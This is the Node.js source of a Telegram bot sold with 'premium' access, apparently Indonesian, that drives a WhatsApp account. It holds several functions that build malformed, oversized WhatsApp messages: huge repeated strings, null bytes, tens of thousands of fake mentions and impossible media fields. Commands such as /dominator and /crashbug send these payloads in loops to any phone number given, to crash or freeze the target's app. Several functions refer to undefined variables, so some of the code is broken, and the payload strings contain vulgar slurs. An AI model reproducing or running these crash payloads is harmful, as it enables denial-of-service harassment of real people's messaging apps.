const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const crypto = require("crypto");
const { 
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    prepareWAMessageMedia,
    generateWAMessageFromContent
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const { TokenS, admins } = require("./nullnull/Setting");

const bot = new TelegramBot(TokenS, { polling: true });
const PREMIUM_FILE = './premiumusers.json';
let Raja = null;
let WhatsAppConnected = false;

// ==================== FUNGSI UTAMA ====================
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const isAdmin = (userId) => admins.includes(String(userId));
const isOwner = (userId) => String(userId) === String(ownerId);

// ==================== FUNGSI PREMIUM ====================
const readPremiumUsers = async () => {
  try {
    const data = await fs.promises.readFile(PREMIUM_FILE, 'utf-8');
    const jsonData = JSON.parse(data);
    
    if (!jsonData || !Array.isArray(jsonData.premiumUsers)) {
      throw new Error('Format file premium tidak valid');
    }
    
    return jsonData.premiumUsers.map(id => String(id));
  } catch (error) {
    if (error.code === 'ENOENT') {
      await fs.promises.writeFile(PREMIUM_FILE, JSON.stringify({ premiumUsers: [] }, null, 2));
      return [];
    }
    throw error;
  }
};

const writePremiumUsers = async (premiumUsers) => {
  await fs.promises.writeFile(
    PREMIUM_FILE,
    JSON.stringify({ premiumUsers }, null, 2),
    'utf-8'
  );
};

const isPremiumUser = async (userId) => {
  const premiumUsers = await readPremiumUsers();
  return premiumUsers.includes(String(userId));
};

// ==================== FUNGSI LAINNYA ====================
const sendTypingIndicator = async (chatId) => {
  await bot.sendChatAction(chatId, 'typing');
};

// ==================== HANDLER COMMAND ====================
// Handler: /addprem
bot.onText(/\/addprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const targetId = match[1].trim();

  await sendTypingIndicator(chatId);

  if (!isAdmin(userId)) {
    return bot.sendMessage(chatId, '⛔ Akses ditolak! Hanya admin yang bisa menambahkan premium.');
  }

  if (!/^\d+$/.test(targetId)) {
    return bot.sendMessage(chatId, '❌ Format ID tidak valid!');
  }

  try {
    const premiumUsers = await readPremiumUsers();
    if (premiumUsers.includes(targetId)) {
      return bot.sendMessage(chatId, '❌ User sudah premium!');
    }

    premiumUsers.push(targetId);
    await writePremiumUsers(premiumUsers);
    bot.sendMessage(chatId, `✅ User ${targetId} berhasil ditambahkan ke premium!`);
  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// Handler: /delprem
bot.onText(/\/delprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const targetId = match[1].trim();

  await sendTypingIndicator(chatId);

  if (!isAdmin(userId)) {
    return bot.sendMessage(chatId, '⛔ Akses ditolak! Hanya admin yang bisa menghapus premium.');
  }

  try {
    let premiumUsers = await readPremiumUsers();
    if (!premiumUsers.includes(targetId)) {
      return bot.sendMessage(chatId, '❌ User tidak terdaftar sebagai premium!');
    }

    premiumUsers = premiumUsers.filter(id => id !== targetId);
    await writePremiumUsers(premiumUsers);
    bot.sendMessage(chatId, `✅ User ${targetId} berhasil dihapus dari premium!`);
  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// Handler: /reqpair
bot.onText(/\/reqbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const phoneNumber = match[1].replace(/[^0-9]/g, '');

  await sendTypingIndicator(chatId);

  try {
    const code = await Raja.requestPairingCode(phoneNumber.trim());
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
    bot.sendMessage(chatId, `🔑 Kode Pairing: <code>${formattedCode}</code>\n\n⚠️ Berlaku 30 detik`, { parse_mode: 'HTML' });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// Handler: /delsession
bot.onText(/\/delsession/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  await sendTypingIndicator(chatId);

  if (!isAdmin(userId)) {
    return bot.sendMessage(chatId, '⛔ Akses ditolak!');
  }

  try {
    await fs.promises.rm('./session', { recursive: true, force: true });
    WhatsAppConnected = false;
    await bot.sendMessage(chatId, '✅ Session dihapus!');
    startSesi();
  } catch (error) {
    await bot.sendMessage(chatId, '❌ Gagal menghapus session!');
  }
});

// Handler: /dominator (Premium)
bot.onText(/\/dominator (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const q = match[1];
  
  await sendTypingIndicator(chatId);

  if (!(await isPremiumUser(userId))) {
    return bot.sendMessage(chatId, '⛔ Fitur ini hanya untuk user premium!\nHubungi admin untuk upgrade premium.');
  }

  if (!WhatsAppConnected) {
    return bot.sendMessage(chatId, "⛔ WhatsApp belum terhubung!", {
      reply_markup: { inline_keyboard: [[{ text: "Pair WhatsApp", callback_data: "reqpair" }]] }
    });
  }

  const targetJid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  
  try {
    for (let i = 0; i < 100; i++) {
      await delayforceMessage(targetJid);
      await invisPayload(targetJid);
    }
    bot.sendMessage(chatId, '✅ Serangan plague berhasil diluncurkan!');
  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// Handler: /tornadonator (Premium)
bot.onText(/\/reallity (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const q = match[1];
  
  await sendTypingIndicator(chatId);

  if (!(await isPremiumUser(userId))) {
    return bot.sendMessage(chatId, '⛔ Fitur ini hanya untuk user premium!\nHubungi admin untuk upgrade premium.');
  }

  if (!WhatsAppConnected) {
    return bot.sendMessage(chatId, "⛔ WhatsApp belum terhubung!", {
      reply_markup: { inline_keyboard: [[{ text: "Pair WhatsApp", callback_data: "reqpair" }]] }
    });
  }

  const targetJid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  
  try {
    for (let i = 0; i < 100; i++) {
      await invc2(targetJid);
      await CrashCursor(targetJid);
    }
    bot.sendMessage(chatId, '✅ Serangan voidglx berhasil diluncurkan!');
  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

bot.onText(/\/crashbug (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = String(msg.from.id);
    const q = match[1];
        
    await sendTypingIndicator(chatId);
    
    
  if (!(await isPremiumUser(userId))) {
    return bot.sendMessage(chatId, '⛔ Fitur ini hanya untuk user premium!\nHubungi admin untuk upgrade premium.');
  }

    if (!WhatsAppConnected) {
        return bot.sendMessage(chatId, "⛔ WhatsApp belum terhubung!", {
            reply_markup: { inline_keyboard: [[{ text: "Pair WhatsApp", callback_data: "reqpair" }]] }
        });
    }

    const targetJid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    try {
         for (let i = 0; i < 10; i++) {  
           await reallity(targetJid);
           await CrashCursor(targetJid);
           await reallityv2(targetJid);
           await CrashCursor(targetJid);
    }
        bot.sendMessage(chatId, 'Successfully launched a fatal attack');
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// Handler: Callback
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const queryId = query.id;

    await sendTypingIndicator(chatId);

    if (query.data === "reqpair") {
        return bot.answerCallbackQuery(queryId, {
            text: "Gunakan /reqpair [nomor] untuk pairing!",
            show_alert: true
        });
    }
});


// Handler: Callback
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const queryId = query.id;

    await sendTypingIndicator(chatId);

    if (query.data === "reqpair") {
        return bot.answerCallbackQuery(queryId, {
            text: "Gunakan /reqpair [nomor] untuk pairing!",
            show_alert: true
        });
    }
});

// Handler: /start
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;

    // Tampilkan status mengetik
    await sendTypingIndicator(chatId);

    const rajamenu = `
<b>╭─═⊱ R E A L L I T Y ─═⬡</b>
<b>┃► Owner : MIKHAEL</b>
<b>┃► Version : 1.3</b>
<b>┃► THEME : SIMPLE VERSION</b>
<b>╰─━─━─━─━─━─━─━─━─━─━─━─━┛</b>    
<b>╭─═──═─═⊱ OWNER SETTING ──═──═──═⬡</b>
<b>┃► /addprem</b>
<b>┃► /delprem</b>
<b>┃► /reqbot</b>
<b>┃► /delsession</b>
<b>╰─━─━─━─━─━─━─━─━─━─━─━─━┛</b>
<b>╭─═──═─═⊱ Bug Menu ═─═──═─⬡</b>
<b>┃► /dominator - delay force</b>
<b>┃► /reallity - infinities delay</b>
<b>┃► /crashbug - bussiness crash</b>    
<b>╰─━─━─━─━─━─━─━─━─━─━─━─━┛</b>    
<b>╭──────═⊱ Thanks - To ───────═⬡</b>
<b>┃► MIKHAEL -Owner</b>
<b>┃► Team NOXLEVIATHAN</b>
<b>╰─━─━─━─━─━─━─━─━─━─━─━─━┛</b>
`;

    const keyboard = {
        inline_keyboard: [
            [{ text: "「OWNER」", url: "https://t.me/RajaXyrine" }]
        ]
    };

    bot.sendPhoto(chatId, 'https://d.top4top.io/p_353867k6u1.jpg', {
        caption: rajamenu,
        parse_mode: "HTML",
        reply_markup: keyboard
    });
});

// Error Handling
bot.on('polling_error', (error) => {
    console.error('[BOT] Error:', error);
});

// ==================== WHATSAPP CONNECTION ====================
const startSesi = async () => {
  
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async () => ({ conversation: 'Galaxy' }),
  };

  Raja = makeWASocket(connectionOptions);
  Raja.ev.on('creds.update', saveCreds);
  store.bind(Raja.ev);

  Raja.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      WhatsAppConnected = true;
      console.clear();
      console.log(
      chalk.bold.white(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣾⣼⢀⣆⣀⠀⡆⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣠⣶⣽⣸⣯⣼⣽⣿⣼⣿⣧⣿⣷⢾⣷⣤⡎⠀⢠⠂⠀⠀⠀
⠀⠀⠀⡀⢤⣜⢯⣼⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡳⢮⡵⢓⡔⡀⡀⠀
⠀⠀⢢⡸⣫⣿⣿⡿⢋⣵⠟⠋⢁⣀⣀⡀⠉⠛⢿⣿⣿⣿⣿⣿⣷⣿⣵⢣⠃
⠀⢈⣮⣟⣿⢻⡏⠀⣼⡏⠀⣰⡟⠋⠉⠛⢷⣄⠀⢻⡾⡻⣿⣿⣿⣽⣗⡯⠋
⠈⣾⣿⠫⠄⢸⡇⠀⢻⣧⠀⠘⠟⢛⣷⠀⠈⣿⠀⢈⣿⠎⠈⣿⢿⣷⣿⠶⠂
⠟⡹⢇⢳⢆⠈⢿⣆⠀⠙⠿⠶⠶⠿⠋⢀⣼⡟⠀⡼⠋⢀⣼⣿⢷⢥⡟⠀⠀
⠀⣕⣭⣚⠬⣑⣂⠽⠿⣶⣤⣤⣤⣤⣶⠟⢋⢤⣊⣀⣴⣿⠛⡻⡜⡼⠀⠀⠀
⠀⠀⣍⣩⣖⠄⡘⠋⠿⢲⠶⢷⡿⡴⡶⡴⢶⣟⢿⢪⢳⠓⠁⠐⡱⠃⠀⠀⠀
⠀⠀⠁⠈⠑⠮⡓⠬⣁⠀⠁⠀⡁⠏⠿⠘⠘⠺⡎⠁⡹⠔⠁⠔⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠐⠂⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      SCRIPT INFORMATION
Author  : AMETHYST
VERSION : 1.0(BETA)
NAME    : REALLITY BUG WHATSAPP
        `)
      );
      console.log(chalk.bold.green('[SYSTEM] WhatsApp Connected!'));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      WhatsAppConnected = false;
      shouldReconnect && startSesi();
    }
  });
};

//===={ FUNCTION BUG }====\\
async function invc2(targetJid) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "bang paket" + "ꦾ".repeat(45000),
                address: "×",
              },
            },
            body: {
              text: "X-delay" + "ꦾ".repeat(45000),
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(10000),
            },
            contextInfo: {
              participant: isTarget,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
                documentMessage: {
                  fileName: "coreXdelay.js",
                  mimetype: "text/plain",
                  fileLength: 10000000000,
                  caption: "coreXdelay",
                  pageCount: 1,
                  mediaKey: "\u0000".repeat(90),
                  jpegThumbnail: Buffer.from(""),
                },
              },
            },
          },
        },
      },
    };

    await dim.relayMessage(isTarget, message, {
      messageId: null,
      participant: { jid: targetJid },
      userJid: isTarget,
    });
  } catch (e) {
    console.log(e);
  }
}


async function CrashCursor(targetJid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: " 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰   " + "ꦾ".repeat(25000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: Raja.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 39567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: " 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰   ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption: " 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰   ",
                },
                contentText: " 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰   ",
                footerText: " 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰   ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: " 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰   ",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/RajaXyrine*",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: " 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰   ",
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: " 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰   ",
              thumbnail: "",
              sourceUrl: " 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰   ",
              sourceId: " 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰   ",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: ` 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰     - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: " 🦠⃟͒  ⃨⃨⃨𝐗͡ 𝐓͢͡𝐎𝐑͢͡𝐍͡𝐀͢͡𝐃͡𝐎͡ 𝐈͢͡𝐍𝐅𝐈͢͡𝐍͡𝐈͡𝐓͢͡𝐘 ヶ⃔͒⃰   ",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await Raja.relayMessage(targetJid, messagePayload, {
    participant: { jid: targetJid},
  });
}

async function reallity(targetJid) {
  for (let r = 0; r < 1; r++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
           messageContextInfo: {
            deviceListMetadata: {}, 
            deviceListMetaeataVersion: 2,
            messageSecret: crypto.randomBytes(25), 
            supportPayload: {
            version: 2,
            is_ai_message: true, 
            should_show_system_message: true, 
            ticket_id: crypto.randomBytes(2008)
            }
           }, 
            interactiveMessage: {
              header: {
                text: '<𝐂𝐫𝐚𝐬𝐡\\>',
                locationMessage: {
                  degreesLatitude: 999999999,
                  degreesLongitude: -999999999,
                  name: '{'.repeat(100000),
                  address: '{'.repeat(100000)
                }
              },
              body: { text: "Vortunix Is Here ☀" },
              footer: { text: "Vortunix Is Here ☀" },
              nativeFlowMessage: {
                messageParamsJson: '{'.repeat(30000)
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "o2Eb2bT8YhZ8cqXOEYAognoQD/PsaEjg8FE9NbF9tDs=",
                fileLength: "182328",
                height: 1280,
                width: 1280,
                mediaKey: "npSqB+cuTkghZ2rifzzMQkhyUf5d8Iwa+5HlHGL3tcA=",
                caption: "<𝐂𝐫𝐚𝐬𝐡\\>",
                fileEncSha256: "nQZ221+c8J3gzT77f7Li33klE8TagaSjA7AM55arqLA=",
                directPath: "/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1750938694",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "vjSnpPeWQ7ly+37/XaC1e4XwwiPHUaIvPWyf3/Pqlbw=",
                fileLength: "3070510",
                seconds: 16,
                mediaKey: "GE3pFBmSXUH2lWGJKvJYY2U5BIgZyVKQF6JJyzaZNWI=",
                height: 864,
                width: 480,
                fileEncSha256: "n6q6pu9BeJ0dDkSRpKa8y2OtVbZ2bw6pLfKzoyFB/Yc=",
                directPath: "/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1749720441",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }
            }
          }
        }
      };
      
      const msg = await generateWAMessageFromContent(target, message, { quoted: null });
      
      await gyzen.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
      
      console.log(`force 𝘾𝙡𝙤𝙨𝙚${targetJid}`);
    } catch (err) {
      console.error("❌ 𝙂𝙖𝙜𝙖𝙡 𝙈𝙚𝙣𝙜𝙚𝙧𝙞𝙢 𝘽𝙪𝙜:", err);
    }
  }
}

async function reallityv2(targetJid) {
  const ButtonsFreeze = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 10; i++) {
    ButtonsFreeze.push(
      { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }
  
  const msg = await generateWAMessageFromContent(
    targetJid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              locationMessage: {
                degreesLatitude: -0,
                degreesLongtitude: 0,
              },
              hasMediaAttachment: true,
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () =>
                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              remoteJid: "X",
              participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
             stanzaId: "123",
             quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
              }
            },
            body: {
              text: "⌁⃰ཀ",
            },
            nativeFlowMessage: {
              buttons: ButtonsFreeze,
              messageParamJson: "{".repeat(10000) 
            },
          },
        },
      },
    },
    {}
  );
  
  await sock.relayMessage(targetJid, msg.message, {
    messageId: msg.key.id,
    participant: { jid: targetJid },
  });
  console.log(chalk.red(`Succes Sending Bug LocaFreeze To ${targetJid}`));
}

// ==================== START BOT ====================
startSesi();
console.log(chalk.green('[BOT] Bot aktif!'));

// Inisialisasi file premium
if (!fs.existsSync(PREMIUM_FILE)) {
  fs.writeFileSync(PREMIUM_FILE, JSON.stringify({ premiumUsers: [] }, null, 2));
}